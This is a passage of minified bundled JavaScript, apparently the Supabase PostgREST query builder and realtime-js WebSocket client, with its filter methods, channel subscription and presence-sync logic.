                    (d = JSON.parse(b)),
                        Array.isArray(d) && i.status === 404 && ((h = []), (d = null), (v = 200), (y = "OK"));
                } catch {
                    i.status === 404 && b === "" ? ((v = 204), (y = "No Content")) : (d = { message: b });
                }
                if (
                    (d &&
                        this.isMaybeSingle &&
                        !((c = d == null ? void 0 : d.details) === null || c === void 0) &&
                        c.includes("0 rows") &&
                        ((d = null), (v = 200), (y = "OK")),
                    d && this.shouldThrowOnError)
                )
                    throw new oy.default(d);
            }
            return { error: d, data: h, count: f, status: v, statusText: y };
        });
        return (
            this.shouldThrowOnError ||
                (s = s.catch((i) => {
                    var o, a, l;
                    return {
                        error: {
                            message: `${(o = i == null ? void 0 : i.name) !== null && o !== void 0 ? o : "FetchError"}: ${i == null ? void 0 : i.message}`,
                            details: `${(a = i == null ? void 0 : i.stack) !== null && a !== void 0 ? a : ""}`,
                            hint: "",
                            code: `${(l = i == null ? void 0 : i.code) !== null && l !== void 0 ? l : ""}`,
                        },
                        data: null,
                        count: null,
                        status: 0,
                        statusText: "",
                    };
                })),
            s.then(e, n)
        );
    }
    returns() {
        return this;
    }
    overrideTypes() {
        return this;
    }
};
io.default = ay;
var ly =
    (Ge && Ge.__importDefault) ||
    function (t) {
        return t && t.__esModule ? t : { default: t };
    };
Object.defineProperty(so, "__esModule", { value: !0 });
const uy = ly(io);
let cy = class extends uy.default {
    select(e) {
        let n = !1;
        const r = (e ?? "*")
            .split("")
            .map((s) => (/\s/.test(s) && !n ? "" : (s === '"' && (n = !n), s)))
            .join("");
        return this.url.searchParams.set("select", r), this.headers.append("Prefer", "return=representation"), this;
    }
    order(e, { ascending: n = !0, nullsFirst: r, foreignTable: s, referencedTable: i = s } = {}) {
        const o = i ? `${i}.order` : "order",
            a = this.url.searchParams.get(o);
        return (
            this.url.searchParams.set(
                o,
                `${a ? `${a},` : ""}${e}.${n ? "asc" : "desc"}${r === void 0 ? "" : r ? ".nullsfirst" : ".nullslast"}`
            ),
            this
        );
    }
    limit(e, { foreignTable: n, referencedTable: r = n } = {}) {
        const s = typeof r > "u" ? "limit" : `${r}.limit`;
        return this.url.searchParams.set(s, `${e}`), this;
    }
    range(e, n, { foreignTable: r, referencedTable: s = r } = {}) {
        const i = typeof s > "u" ? "offset" : `${s}.offset`,
            o = typeof s > "u" ? "limit" : `${s}.limit`;
        return this.url.searchParams.set(i, `${e}`), this.url.searchParams.set(o, `${n - e + 1}`), this;
    }
    abortSignal(e) {
        return (this.signal = e), this;
    }
    single() {
        return this.headers.set("Accept", "application/vnd.pgrst.object+json"), this;
    }
    maybeSingle() {
        return (
            this.method === "GET"
                ? this.headers.set("Accept", "application/json")
                : this.headers.set("Accept", "application/vnd.pgrst.object+json"),
            (this.isMaybeSingle = !0),
            this
        );
    }
    csv() {
        return this.headers.set("Accept", "text/csv"), this;
    }
    geojson() {
        return this.headers.set("Accept", "application/geo+json"), this;
    }
    explain({
        analyze: e = !1,
        verbose: n = !1,
        settings: r = !1,
        buffers: s = !1,
        wal: i = !1,
        format: o = "text",
    } = {}) {
        var a;
        const l = [
                e ? "analyze" : null,
                n ? "verbose" : null,
                r ? "settings" : null,
                s ? "buffers" : null,
                i ? "wal" : null,
            ]
                .filter(Boolean)
                .join("|"),
            c = (a = this.headers.get("Accept")) !== null && a !== void 0 ? a : "application/json";
        return (
            this.headers.set("Accept", `application/vnd.pgrst.plan+${o}; for="${c}"; options=${l};`),
            o === "json" ? this : this
        );
    }
    rollback() {
        return this.headers.append("Prefer", "tx=rollback"), this;
    }
    returns() {
        return this;
    }
    maxAffected(e) {
        return (
            this.headers.append("Prefer", "handling=strict"), this.headers.append("Prefer", `max-affected=${e}`), this
        );
    }
};
so.default = cy;
var dy =
    (Ge && Ge.__importDefault) ||
    function (t) {
        return t && t.__esModule ? t : { default: t };
    };
Object.defineProperty(ks, "__esModule", { value: !0 });
const hy = dy(so);
let fy = class extends hy.default {
    eq(e, n) {
        return this.url.searchParams.append(e, `eq.${n}`), this;
    }
    neq(e, n) {
        return this.url.searchParams.append(e, `neq.${n}`), this;
    }
    gt(e, n) {
        return this.url.searchParams.append(e, `gt.${n}`), this;
    }
    gte(e, n) {
        return this.url.searchParams.append(e, `gte.${n}`), this;
    }
    lt(e, n) {
        return this.url.searchParams.append(e, `lt.${n}`), this;
    }
    lte(e, n) {
        return this.url.searchParams.append(e, `lte.${n}`), this;
    }
    like(e, n) {
        return this.url.searchParams.append(e, `like.${n}`), this;
    }
    likeAllOf(e, n) {
        return this.url.searchParams.append(e, `like(all).{${n.join(",")}}`), this;
    }
    likeAnyOf(e, n) {
        return this.url.searchParams.append(e, `like(any).{${n.join(",")}}`), this;
    }
    ilike(e, n) {
        return this.url.searchParams.append(e, `ilike.${n}`), this;
    }
    ilikeAllOf(e, n) {
        return this.url.searchParams.append(e, `ilike(all).{${n.join(",")}}`), this;
    }
    ilikeAnyOf(e, n) {
        return this.url.searchParams.append(e, `ilike(any).{${n.join(",")}}`), this;
    }
    is(e, n) {
        return this.url.searchParams.append(e, `is.${n}`), this;
    }
    in(e, n) {
        const r = Array.from(new Set(n))
            .map((s) => (typeof s == "string" && new RegExp("[,()]").test(s) ? `"${s}"` : `${s}`))
            .join(",");
        return this.url.searchParams.append(e, `in.(${r})`), this;
    }
    contains(e, n) {
        return (
            typeof n == "string"
                ? this.url.searchParams.append(e, `cs.${n}`)
                : Array.isArray(n)
                  ? this.url.searchParams.append(e, `cs.{${n.join(",")}}`)
                  : this.url.searchParams.append(e, `cs.${JSON.stringify(n)}`),
            this
        );
    }
    containedBy(e, n) {
        return (
            typeof n == "string"
                ? this.url.searchParams.append(e, `cd.${n}`)
                : Array.isArray(n)
                  ? this.url.searchParams.append(e, `cd.{${n.join(",")}}`)
                  : this.url.searchParams.append(e, `cd.${JSON.stringify(n)}`),
            this
        );
    }
    rangeGt(e, n) {
        return this.url.searchParams.append(e, `sr.${n}`), this;
    }
    rangeGte(e, n) {
        return this.url.searchParams.append(e, `nxl.${n}`), this;
    }
    rangeLt(e, n) {
        return this.url.searchParams.append(e, `sl.${n}`), this;
    }
    rangeLte(e, n) {
        return this.url.searchParams.append(e, `nxr.${n}`), this;
    }
    rangeAdjacent(e, n) {
        return this.url.searchParams.append(e, `adj.${n}`), this;
    }
    overlaps(e, n) {
        return (
            typeof n == "string"
                ? this.url.searchParams.append(e, `ov.${n}`)
                : this.url.searchParams.append(e, `ov.{${n.join(",")}}`),
            this
        );
    }
    textSearch(e, n, { config: r, type: s } = {}) {
        let i = "";
        s === "plain" ? (i = "pl") : s === "phrase" ? (i = "ph") : s === "websearch" && (i = "w");
        const o = r === void 0 ? "" : `(${r})`;
        return this.url.searchParams.append(e, `${i}fts${o}.${n}`), this;
    }
    match(e) {
        return (
            Object.entries(e).forEach(([n, r]) => {
                this.url.searchParams.append(n, `eq.${r}`);
            }),
            this
        );
    }
    not(e, n, r) {
        return this.url.searchParams.append(e, `not.${n}.${r}`), this;
    }
    or(e, { foreignTable: n, referencedTable: r = n } = {}) {
        const s = r ? `${r}.or` : "or";
        return this.url.searchParams.append(s, `(${e})`), this;
    }
    filter(e, n, r) {
        return this.url.searchParams.append(e, `${n}.${r}`), this;
    }
};
ks.default = fy;
var py =
    (Ge && Ge.__importDefault) ||
    function (t) {
        return t && t.__esModule ? t : { default: t };
    };
Object.defineProperty(ro, "__esModule", { value: !0 });
const Tr = py(ks);
let my = class {
    constructor(e, { headers: n = {}, schema: r, fetch: s }) {
        (this.url = e), (this.headers = new Headers(n)), (this.schema = r), (this.fetch = s);
    }
    select(e, { head: n = !1, count: r } = {}) {
        const s = n ? "HEAD" : "GET";
        let i = !1;
        const o = (e ?? "*")
            .split("")
            .map((a) => (/\s/.test(a) && !i ? "" : (a === '"' && (i = !i), a)))
            .join("");
        return (
            this.url.searchParams.set("select", o),
            r && this.headers.append("Prefer", `count=${r}`),
            new Tr.default({ method: s, url: this.url, headers: this.headers, schema: this.schema, fetch: this.fetch })
        );
    }
    insert(e, { count: n, defaultToNull: r = !0 } = {}) {
        var s;
        const i = "POST";
        if (
            (n && this.headers.append("Prefer", `count=${n}`),
            r || this.headers.append("Prefer", "missing=default"),
            Array.isArray(e))
        ) {
            const o = e.reduce((a, l) => a.concat(Object.keys(l)), []);
            if (o.length > 0) {
                const a = [...new Set(o)].map((l) => `"${l}"`);
                this.url.searchParams.set("columns", a.join(","));
            }
        }
        return new Tr.default({
            method: i,
            url: this.url,
            headers: this.headers,
            schema: this.schema,
            body: e,
            fetch: (s = this.fetch) !== null && s !== void 0 ? s : fetch,
        });
    }
    upsert(e, { onConflict: n, ignoreDuplicates: r = !1, count: s, defaultToNull: i = !0 } = {}) {
        var o;
        const a = "POST";
        if (
            (this.headers.append("Prefer", `resolution=${r ? "ignore" : "merge"}-duplicates`),
            n !== void 0 && this.url.searchParams.set("on_conflict", n),
            s && this.headers.append("Prefer", `count=${s}`),
            i || this.headers.append("Prefer", "missing=default"),
            Array.isArray(e))
        ) {
            const l = e.reduce((c, d) => c.concat(Object.keys(d)), []);
            if (l.length > 0) {
                const c = [...new Set(l)].map((d) => `"${d}"`);
                this.url.searchParams.set("columns", c.join(","));
            }
        }
        return new Tr.default({
            method: a,
            url: this.url,
            headers: this.headers,
            schema: this.schema,
            body: e,
            fetch: (o = this.fetch) !== null && o !== void 0 ? o : fetch,
        });
    }
    update(e, { count: n } = {}) {
        var r;
        const s = "PATCH";
        return (
            n && this.headers.append("Prefer", `count=${n}`),
            new Tr.default({
                method: s,
                url: this.url,
                headers: this.headers,
                schema: this.schema,
                body: e,
                fetch: (r = this.fetch) !== null && r !== void 0 ? r : fetch,
            })
        );
    }
    delete({ count: e } = {}) {
        var n;
        const r = "DELETE";
        return (
            e && this.headers.append("Prefer", `count=${e}`),
            new Tr.default({
                method: r,
                url: this.url,
                headers: this.headers,
                schema: this.schema,
                fetch: (n = this.fetch) !== null && n !== void 0 ? n : fetch,
            })
        );
    }
};
ro.default = my;
var Lf =
    (Ge && Ge.__importDefault) ||
    function (t) {
        return t && t.__esModule ? t : { default: t };
    };
Object.defineProperty(du, "__esModule", { value: !0 });
const gy = Lf(ro),
    vy = Lf(ks);
let yy = class Mf {
    constructor(e, { headers: n = {}, schema: r, fetch: s } = {}) {
        (this.url = e), (this.headers = new Headers(n)), (this.schemaName = r), (this.fetch = s);
    }
    from(e) {
        const n = new URL(`${this.url}/${e}`);
        return new gy.default(n, { headers: new Headers(this.headers), schema: this.schemaName, fetch: this.fetch });
    }
    schema(e) {
        return new Mf(this.url, { headers: this.headers, schema: e, fetch: this.fetch });
    }
    rpc(e, n = {}, { head: r = !1, get: s = !1, count: i } = {}) {
        var o;
        let a;
        const l = new URL(`${this.url}/rpc/${e}`);
        let c;
        r || s
            ? ((a = r ? "HEAD" : "GET"),
              Object.entries(n)
                  .filter(([h, f]) => f !== void 0)
                  .map(([h, f]) => [h, Array.isArray(f) ? `{${f.join(",")}}` : `${f}`])
                  .forEach(([h, f]) => {
                      l.searchParams.append(h, f);
                  }))
            : ((a = "POST"), (c = n));
        const d = new Headers(this.headers);
        return (
            i && d.set("Prefer", `count=${i}`),
            new vy.default({
                method: a,
                url: l,
                headers: d,
                schema: this.schemaName,
                body: c,
                fetch: (o = this.fetch) !== null && o !== void 0 ? o : fetch,
            })
        );
    }
};
du.default = yy;
var vr =
    (Ge && Ge.__importDefault) ||
    function (t) {
        return t && t.__esModule ? t : { default: t };
    };
Object.defineProperty(Ce, "__esModule", { value: !0 });
Ce.PostgrestError =
    Ce.PostgrestBuilder =
    Ce.PostgrestTransformBuilder =
    Ce.PostgrestFilterBuilder =
    Ce.PostgrestQueryBuilder =
    Ce.PostgrestClient =
        void 0;
const Uf = vr(du);
Ce.PostgrestClient = Uf.default;
const Df = vr(ro);
Ce.PostgrestQueryBuilder = Df.default;
const zf = vr(ks);
Ce.PostgrestFilterBuilder = zf.default;
const Ff = vr(so);
Ce.PostgrestTransformBuilder = Ff.default;
const Bf = vr(io);
Ce.PostgrestBuilder = Bf.default;
const Vf = vr(oo);
Ce.PostgrestError = Vf.default;
var xy = (Ce.default = {
    PostgrestClient: Uf.default,
    PostgrestQueryBuilder: Df.default,
    PostgrestFilterBuilder: zf.default,
    PostgrestTransformBuilder: Ff.default,
    PostgrestBuilder: Bf.default,
    PostgrestError: Vf.default,
});
const {
    PostgrestClient: wy,
    PostgrestQueryBuilder: Jw,
    PostgrestFilterBuilder: Xw,
    PostgrestTransformBuilder: Yw,
    PostgrestBuilder: Zw,
    PostgrestError: e1,
} = xy;
class _y {
    static detectEnvironment() {
        var e;
        if (typeof WebSocket < "u") return { type: "native", constructor: WebSocket };
        if (typeof globalThis < "u" && typeof globalThis.WebSocket < "u")
            return { type: "native", constructor: globalThis.WebSocket };
        if (typeof global < "u" && typeof global.WebSocket < "u")
            return { type: "native", constructor: global.WebSocket };
        if (typeof globalThis < "u" && typeof globalThis.WebSocketPair < "u" && typeof globalThis.WebSocket > "u")
            return {
                type: "cloudflare",
                error: "Cloudflare Workers detected. WebSocket clients are not supported in Cloudflare Workers.",
                workaround:
                    "Use Cloudflare Workers WebSocket API for server-side WebSocket handling, or deploy to a different runtime.",
            };
        if (
            (typeof globalThis < "u" && globalThis.EdgeRuntime) ||
            (typeof navigator < "u" &&
                !((e = navigator.userAgent) === null || e === void 0) &&
                e.includes("Vercel-Edge"))
        )
            return {
                type: "unsupported",
                error: "Edge runtime detected (Vercel Edge/Netlify Edge). WebSockets are not supported in edge functions.",
                workaround: "Use serverless functions or a different deployment target for WebSocket functionality.",
            };
        if (typeof process < "u") {
            const n = process.versions;
            if (n && n.node) {
                const r = n.node,
                    s = parseInt(r.replace(/^v/, "").split(".")[0]);
                return s >= 22
                    ? typeof globalThis.WebSocket < "u"
                        ? { type: "native", constructor: globalThis.WebSocket }
                        : {
                              type: "unsupported",
                              error: `Node.js ${s} detected but native WebSocket not found.`,
                              workaround: "Provide a WebSocket implementation via the transport option.",
                          }
                    : {
                          type: "unsupported",
                          error: `Node.js ${s} detected without native WebSocket support.`,
                          workaround: `For Node.js < 22, install "ws" package and provide it via the transport option:
import ws from "ws"
new RealtimeClient(url, { transport: ws })`,
                      };
            }
        }
        return {
            type: "unsupported",
            error: "Unknown JavaScript runtime without WebSocket support.",
            workaround:
                "Ensure you're running in a supported environment (browser, Node.js, Deno) or provide a custom WebSocket implementation.",
        };
    }
    static getWebSocketConstructor() {
        const e = this.detectEnvironment();
        if (e.constructor) return e.constructor;
        let n = e.error || "WebSocket not supported in this environment.";
        throw (
            (e.workaround &&
                (n += `

Suggested solution: ${e.workaround}`),
            new Error(n))
        );
    }
    static createWebSocket(e, n) {
        const r = this.getWebSocketConstructor();
        return new r(e, n);
    }
    static isWebSocketSupported() {
        try {
            const e = this.detectEnvironment();
            return e.type === "native" || e.type === "ws";
        } catch {
            return !1;
        }
    }
}
const by = "2.15.5",
    ky = `realtime-js/${by}`,
    Sy = "1.0.0",
    Za = 1e4,
    jy = 1e3,
    Ey = 100;
var Hr;
(function (t) {
    (t[(t.connecting = 0)] = "connecting"),
        (t[(t.open = 1)] = "open"),
        (t[(t.closing = 2)] = "closing"),
        (t[(t.closed = 3)] = "closed");
})(Hr || (Hr = {}));
var re;
(function (t) {
    (t.closed = "closed"),
        (t.errored = "errored"),
        (t.joined = "joined"),
        (t.joining = "joining"),
        (t.leaving = "leaving");
})(re || (re = {}));
var et;
(function (t) {
    (t.close = "phx_close"),
        (t.error = "phx_error"),
        (t.join = "phx_join"),
        (t.reply = "phx_reply"),
        (t.leave = "phx_leave"),
        (t.access_token = "access_token");
})(et || (et = {}));
var el;
(function (t) {
    t.websocket = "websocket";
})(el || (el = {}));
var pn;
(function (t) {
    (t.Connecting = "connecting"), (t.Open = "open"), (t.Closing = "closing"), (t.Closed = "closed");
})(pn || (pn = {}));
class Ny {
    constructor() {
        this.HEADER_LENGTH = 1;
    }
    decode(e, n) {
        return e.constructor === ArrayBuffer ? n(this._binaryDecode(e)) : n(typeof e == "string" ? JSON.parse(e) : {});
    }
    _binaryDecode(e) {
        const n = new DataView(e),
            r = new TextDecoder();
        return this._decodeBroadcast(e, n, r);
    }
    _decodeBroadcast(e, n, r) {
        const s = n.getUint8(1),
            i = n.getUint8(2);
        let o = this.HEADER_LENGTH + 2;
        const a = r.decode(e.slice(o, o + s));
        o = o + s;
        const l = r.decode(e.slice(o, o + i));
        o = o + i;
        const c = JSON.parse(r.decode(e.slice(o, e.byteLength)));
        return { ref: null, topic: a, event: l, payload: c };
    }
}
class Wf {
    constructor(e, n) {
        (this.callback = e),
            (this.timerCalc = n),
            (this.timer = void 0),
            (this.tries = 0),
            (this.callback = e),
            (this.timerCalc = n);
    }
    reset() {
        (this.tries = 0), clearTimeout(this.timer), (this.timer = void 0);
    }
    scheduleTimeout() {
        clearTimeout(this.timer),
            (this.timer = setTimeout(
                () => {
                    (this.tries = this.tries + 1), this.callback();
                },
                this.timerCalc(this.tries + 1)
            ));
    }
}
var B;
(function (t) {
    (t.abstime = "abstime"),
        (t.bool = "bool"),
        (t.date = "date"),
        (t.daterange = "daterange"),
        (t.float4 = "float4"),
        (t.float8 = "float8"),
        (t.int2 = "int2"),
        (t.int4 = "int4"),
        (t.int4range = "int4range"),
        (t.int8 = "int8"),
        (t.int8range = "int8range"),
        (t.json = "json"),
        (t.jsonb = "jsonb"),
        (t.money = "money"),
        (t.numeric = "numeric"),
        (t.oid = "oid"),
        (t.reltime = "reltime"),
        (t.text = "text"),
        (t.time = "time"),
        (t.timestamp = "timestamp"),
        (t.timestamptz = "timestamptz"),
        (t.timetz = "timetz"),
        (t.tsrange = "tsrange"),
        (t.tstzrange = "tstzrange");
})(B || (B = {}));
const Bc = (t, e, n = {}) => {
        var r;
        const s = (r = n.skipTypes) !== null && r !== void 0 ? r : [];
        return Object.keys(e).reduce((i, o) => ((i[o] = Cy(o, t, e, s)), i), {});
    },
    Cy = (t, e, n, r) => {
        const s = e.find((a) => a.name === t),
            i = s == null ? void 0 : s.type,
            o = n[t];
        return i && !r.includes(i) ? Hf(i, o) : tl(o);
    },
    Hf = (t, e) => {
        if (t.charAt(0) === "_") {
            const n = t.slice(1, t.length);
            return Oy(e, n);
        }
        switch (t) {
            case B.bool:
                return Py(e);
            case B.float4:
            case B.float8:
            case B.int2:
            case B.int4:
            case B.int8:
            case B.numeric:
            case B.oid:
                return Ty(e);
            case B.json:
            case B.jsonb:
                return Ry(e);
            case B.timestamp:
                return $y(e);
            case B.abstime:
            case B.date:
            case B.daterange:
            case B.int4range:
            case B.int8range:
            case B.money:
            case B.reltime:
            case B.text:
            case B.time:
            case B.timestamptz:
            case B.timetz:
            case B.tsrange:
            case B.tstzrange:
                return tl(e);
            default:
                return tl(e);
        }
    },
    tl = (t) => t,
    Py = (t) => {
        switch (t) {
            case "t":
                return !0;
            case "f":
                return !1;
            default:
                return t;
        }
    },
    Ty = (t) => {
        if (typeof t == "string") {
            const e = parseFloat(t);
            if (!Number.isNaN(e)) return e;
        }
        return t;
    },
    Ry = (t) => {
        if (typeof t == "string")
            try {
                return JSON.parse(t);
            } catch (e) {
                return console.log(`JSON parse error: ${e}`), t;
            }
        return t;
    },
    Oy = (t, e) => {
        if (typeof t != "string") return t;
        const n = t.length - 1,
            r = t[n];
        if (t[0] === "{" && r === "}") {
            let i;
            const o = t.slice(1, n);
            try {
                i = JSON.parse("[" + o + "]");
            } catch {
                i = o ? o.split(",") : [];
            }
            return i.map((a) => Hf(e, a));
        }
        return t;
    },
    $y = (t) => (typeof t == "string" ? t.replace(" ", "T") : t),
    qf = (t) => {
        let e = t;
        return (
            (e = e.replace(/^ws/i, "http")),
            (e = e.replace(/(\/socket\/websocket|\/socket|\/websocket)\/?$/i, "")),
            e.replace(/\/+$/, "") + "/api/broadcast"
        );
    };
class Ko {
    constructor(e, n, r = {}, s = Za) {
        (this.channel = e),
            (this.event = n),
            (this.payload = r),
            (this.timeout = s),
            (this.sent = !1),
            (this.timeoutTimer = void 0),
            (this.ref = ""),
            (this.receivedResp = null),
            (this.recHooks = []),
            (this.refEvent = null);
    }
    resend(e) {
        (this.timeout = e),
            this._cancelRefEvent(),
            (this.ref = ""),
            (this.refEvent = null),
            (this.receivedResp = null),
            (this.sent = !1),
            this.send();
    }
    send() {
        this._hasReceived("timeout") ||
            (this.startTimeout(),
            (this.sent = !0),
            this.channel.socket.push({
                topic: this.channel.topic,
                event: this.event,
                payload: this.payload,
                ref: this.ref,
                join_ref: this.channel._joinRef(),
            }));
    }
    updatePayload(e) {
        this.payload = Object.assign(Object.assign({}, this.payload), e);
    }
    receive(e, n) {
        var r;
        return (
            this._hasReceived(e) && n((r = this.receivedResp) === null || r === void 0 ? void 0 : r.response),
            this.recHooks.push({ status: e, callback: n }),
            this
        );
    }
    startTimeout() {
        if (this.timeoutTimer) return;
        (this.ref = this.channel.socket._makeRef()), (this.refEvent = this.channel._replyEventName(this.ref));
        const e = (n) => {
            this._cancelRefEvent(), this._cancelTimeout(), (this.receivedResp = n), this._matchReceive(n);
        };
        this.channel._on(this.refEvent, {}, e),
            (this.timeoutTimer = setTimeout(() => {
                this.trigger("timeout", {});
            }, this.timeout));
    }
    trigger(e, n) {
        this.refEvent && this.channel._trigger(this.refEvent, { status: e, response: n });
    }
    destroy() {
        this._cancelRefEvent(), this._cancelTimeout();
    }
    _cancelRefEvent() {
        this.refEvent && this.channel._off(this.refEvent, {});
    }
    _cancelTimeout() {
        clearTimeout(this.timeoutTimer), (this.timeoutTimer = void 0);
    }
    _matchReceive({ status: e, response: n }) {
        this.recHooks.filter((r) => r.status === e).forEach((r) => r.callback(n));
    }
    _hasReceived(e) {
        return this.receivedResp && this.receivedResp.status === e;
    }
}
var Vc;
(function (t) {
    (t.SYNC = "sync"), (t.JOIN = "join"), (t.LEAVE = "leave");
})(Vc || (Vc = {}));
class qr {
    constructor(e, n) {
        (this.channel = e),
            (this.state = {}),
            (this.pendingDiffs = []),
            (this.joinRef = null),
            (this.enabled = !1),
            (this.caller = { onJoin: () => {}, onLeave: () => {}, onSync: () => {} });
        const r = (n == null ? void 0 : n.events) || { state: "presence_state", diff: "presence_diff" };
        this.channel._on(r.state, {}, (s) => {
            const { onJoin: i, onLeave: o, onSync: a } = this.caller;
            (this.joinRef = this.channel._joinRef()),
                (this.state = qr.syncState(this.state, s, i, o)),
                this.pendingDiffs.forEach((l) => {
                    this.state = qr.syncDiff(this.state, l, i, o);
                }),
                (this.pendingDiffs = []),
                a();
        }),
            this.channel._on(r.diff, {}, (s) => {
                const { onJoin: i, onLeave: o, onSync: a } = this.caller;
                this.inPendingSyncState()
                    ? this.pendingDiffs.push(s)
                    : ((this.state = qr.syncDiff(this.state, s, i, o)), a());
            }),
            this.onJoin((s, i, o) => {
                this.channel._trigger("presence", { event: "join", key: s, currentPresences: i, newPresences: o });
            }),
            this.onLeave((s, i, o) => {
                this.channel._trigger("presence", { event: "leave", key: s, currentPresences: i, leftPresences: o });
            }),
            this.onSync(() => {
                this.channel._trigger("presence", { event: "sync" });
            });
    }
    static syncState(e, n, r, s) {
        const i = this.cloneDeep(e),
            o = this.transformState(n),
            a = {},
            l = {};
        return (
            this.map(i, (c, d) => {
                o[c] || (l[c] = d);
            }),
            this.map(o, (c, d) => {
                const h = i[c];
                if (h) {
                    const f = d.map((b) => b.presence_ref),
                        v = h.map((b) => b.presence_ref),
                        y = d.filter((b) => v.indexOf(b.presence_ref) < 0),
                        _ = h.filter((b) => f.indexOf(b.presence_ref) < 0);
                    y.length > 0 && (a[c] = y), _.length > 0 && (l[c] = _);
                } else a[c] = d;
            }),
            this.syncDiff(i, { joins: a, leaves: l }, r, s)
        );
    }
    static syncDiff(e, n, r, s) {
        const { joins: i, leaves: o } = { joins: this.transformState(n.joins), leaves: this.transformState(n.leaves) };
        return (
            r || (r = () => {}),
            s || (s = () => {}),
            this.map(i, (a, l) => {
                var c;
                const d = (c = e[a]) !== null && c !== void 0 ? c : [];
                if (((e[a] = this.cloneDeep(l)), d.length > 0)) {
                    const h = e[a].map((v) => v.presence_ref),
                        f = d.filter((v) => h.indexOf(v.presence_ref) < 0);
                    e[a].unshift(...f);
                }
                r(a, d, l);
            }),
            this.map(o, (a, l) => {
                let c = e[a];
                if (!c) return;
                const d = l.map((h) => h.presence_ref);
                (c = c.filter((h) => d.indexOf(h.presence_ref) < 0)),
                    (e[a] = c),
                    s(a, c, l),
                    c.length === 0 && delete e[a];
            }),
            e
        );
    }
    static map(e, n) {
        return Object.getOwnPropertyNames(e).map((r) => n(r, e[r]));
    }
    static transformState(e) {
        return (
            (e = this.cloneDeep(e)),
            Object.getOwnPropertyNames(e).reduce((n, r) => {
                const s = e[r];
                return (
                    "metas" in s
                        ? (n[r] = s.metas.map(
                              (i) => ((i.presence_ref = i.phx_ref), delete i.phx_ref, delete i.phx_ref_prev, i)
                          ))
                        : (n[r] = s),
                    n
                );
            }, {})
        );
    }
    static cloneDeep(e) {
        return JSON.parse(JSON.stringify(e));
    }
    onJoin(e) {
        this.caller.onJoin = e;
    }
    onLeave(e) {
        this.caller.onLeave = e;
    }
    onSync(e) {
        this.caller.onSync = e;
    }
    inPendingSyncState() {
        return !this.joinRef || this.joinRef !== this.channel._joinRef();
    }
}
var Wc;
(function (t) {
    (t.ALL = "*"), (t.INSERT = "INSERT"), (t.UPDATE = "UPDATE"), (t.DELETE = "DELETE");
})(Wc || (Wc = {}));
var Gr;
(function (t) {
    (t.BROADCAST = "broadcast"),
        (t.PRESENCE = "presence"),
        (t.POSTGRES_CHANGES = "postgres_changes"),
        (t.SYSTEM = "system");
})(Gr || (Gr = {}));
var vt;
(function (t) {
    (t.SUBSCRIBED = "SUBSCRIBED"),
        (t.TIMED_OUT = "TIMED_OUT"),
        (t.CLOSED = "CLOSED"),
        (t.CHANNEL_ERROR = "CHANNEL_ERROR");
})(vt || (vt = {}));
class hu {
    constructor(e, n = { config: {} }, r) {
        (this.topic = e),
            (this.params = n),
            (this.socket = r),
            (this.bindings = {}),
            (this.state = re.closed),
            (this.joinedOnce = !1),
            (this.pushBuffer = []),
            (this.subTopic = e.replace(/^realtime:/i, "")),
            (this.params.config = Object.assign(
                { broadcast: { ack: !1, self: !1 }, presence: { key: "", enabled: !1 }, private: !1 },
                n.config
            )),
            (this.timeout = this.socket.timeout),
            (this.joinPush = new Ko(this, et.join, this.params, this.timeout)),
            (this.rejoinTimer = new Wf(() => this._rejoinUntilConnected(), this.socket.reconnectAfterMs)),
            this.joinPush.receive("ok", () => {
                (this.state = re.joined),
                    this.rejoinTimer.reset(),
                    this.pushBuffer.forEach((s) => s.send()),
                    (this.pushBuffer = []);
            }),
            this._onClose(() => {
                this.rejoinTimer.reset(),
                    this.socket.log("channel", `close ${this.topic} ${this._joinRef()}`),
                    (this.state = re.closed),
                    this.socket._remove(this);
            }),
            this._onError((s) => {
                this._isLeaving() ||
                    this._isClosed() ||
                    (this.socket.log("channel", `error ${this.topic}`, s),
                    (this.state = re.errored),
                    this.rejoinTimer.scheduleTimeout());
            }),
            this.joinPush.receive("timeout", () => {
                this._isJoining() &&
                    (this.socket.log("channel", `timeout ${this.topic}`, this.joinPush.timeout),
                    (this.state = re.errored),
                    this.rejoinTimer.scheduleTimeout());
            }),
            this.joinPush.receive("error", (s) => {
                this._isLeaving() ||
                    this._isClosed() ||
                    (this.socket.log("channel", `error ${this.topic}`, s),
                    (this.state = re.errored),
                    this.rejoinTimer.scheduleTimeout());
            }),
            this._on(et.reply, {}, (s, i) => {
                this._trigger(this._replyEventName(i), s);
            }),
            (this.presence = new qr(this)),
            (this.broadcastEndpointURL = qf(this.socket.endPoint)),
            (this.private = this.params.config.private || !1);
    }
    subscribe(e, n = this.timeout) {
        var r, s, i;
        if ((this.socket.isConnected() || this.socket.connect(), this.state == re.closed)) {
            const {
                    config: { broadcast: o, presence: a, private: l },
                } = this.params,
                c =
                    (s =
                        (r = this.bindings.postgres_changes) === null || r === void 0
                            ? void 0
                            : r.map((v) => v.filter)) !== null && s !== void 0
                        ? s
                        : [],
                d =
                    (!!this.bindings[Gr.PRESENCE] && this.bindings[Gr.PRESENCE].length > 0) ||
                    ((i = this.params.config.presence) === null || i === void 0 ? void 0 : i.enabled) === !0,
                h = {},
                f = {
                    broadcast: o,
                    presence: Object.assign(Object.assign({}, a), { enabled: d }),
                    postgres_changes: c,
                    private: l,
                };
            this.socket.accessTokenValue && (h.access_token = this.socket.accessTokenValue),
                this._onError((v) => (e == null ? void 0 : e(vt.CHANNEL_ERROR, v))),
                this._onClose(() => (e == null ? void 0 : e(vt.CLOSED))),
                this.updateJoinPayload(Object.assign({ config: f }, h)),
                (this.joinedOnce = !0),
                this._rejoin(n),
                this.joinPush
                    .receive("ok", async ({ postgres_changes: v }) => {
                        var y;
                        if ((this.socket.setAuth(), v === void 0)) {
                            e == null || e(vt.SUBSCRIBED);
                            return;
                        } else {
                            const _ = this.bindings.postgres_changes,
                                b = (y = _ == null ? void 0 : _.length) !== null && y !== void 0 ? y : 0,
                                g = [];
                            for (let p = 0; p < b; p++) {
                                const m = _[p],
                                    {
                                        filter: { event: w, schema: k, table: j, filter: N },
                                    } = m,
                                    E = v && v[p];
                                if (E && E.event === w && E.schema === k && E.table === j && E.filter === N)
                                    g.push(Object.assign(Object.assign({}, m), { id: E.id }));
                                else {
                                    this.unsubscribe(),
                                        (this.state = re.errored),
                                        e == null ||
                                            e(
                                                vt.CHANNEL_ERROR,
                                                new Error(
                                                    "mismatch between server and client bindings for postgres changes"
                                                )
                                            );
                                    return;
                                }
                            }
                            (this.bindings.postgres_changes = g), e && e(vt.SUBSCRIBED);
                            return;
                        }
                    })
                    .receive("error", (v) => {
                        (this.state = re.errored),
                            e == null ||
